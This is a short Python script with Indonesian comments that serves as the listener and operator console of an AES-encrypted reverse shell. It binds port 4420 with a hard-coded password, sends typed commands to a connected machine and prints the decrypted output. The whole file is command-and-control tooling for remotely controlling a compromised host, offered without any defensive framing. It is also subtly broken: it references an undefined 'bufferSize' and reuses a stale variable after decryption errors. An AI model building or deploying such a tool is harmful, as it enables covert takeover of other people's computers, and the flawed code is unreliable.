import socket,os
import pyAesCrypt
import io

# Konfigurasi socket
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 4420))
c.listen(1)

# Set buffer size dan password
buffer_size = 1024
password = 'test1'

# Accept a single connection
s,a = c.accept()

# Encrypt data
def encryptData(msg):
	edata = str.encode(msg)
	a = io.BytesIO(edata)
	b = io.BytesIO()
	# Mengenkripsi cipher
	pyAesCrypt.encryptStream(a, b, password, buffer_size)
	# Data yg dikirim (bytes-like)
	sendData = b.getvalue()
	return sendData

# Decrypt data
def decryptData(msg):
	# Men-decrypt data ke binary stream
	a = io.BytesIO()
	b = io.BytesIO()
    
	# Mengubah ke byte
	a = io.BytesIO(msg)
	length = len(a.getvalue())
	a.seek(0)

	# Decrypt stream
	pyAesCrypt.decryptStream(a, b, password, bufferSize, length)
	decrypted = str(b.getvalue().decode())
	return decrypted

while True:
	# Menerima data
	data = s.recv(1024)
	try:
		decrypted = decryptData(data)
	except ValueError:
		print('> Decryption error.\n')
		pass
	# Mengecek apakah end of file atau tidak dengan cara melihat apakah decrypted punya akhiran EOF atau tidak
	if decrypted.endswith("EOF") == True:
		# Masukan command selanjutnya
		nxt = input("[shell]: ")
		# Mengirim perintah
		if nxt == 'quit': #Apabila quit maka akan selesai
			print('\nQuitting...')
			s.send(encryptData(nxt))
			break
		else: s.send(encryptData(nxt)) #Masukan perintah yg diinginkan
	# Apabila belum mencapai End of String maka akan terus dilanjutkan
	else:
		print(decrypted, end = '')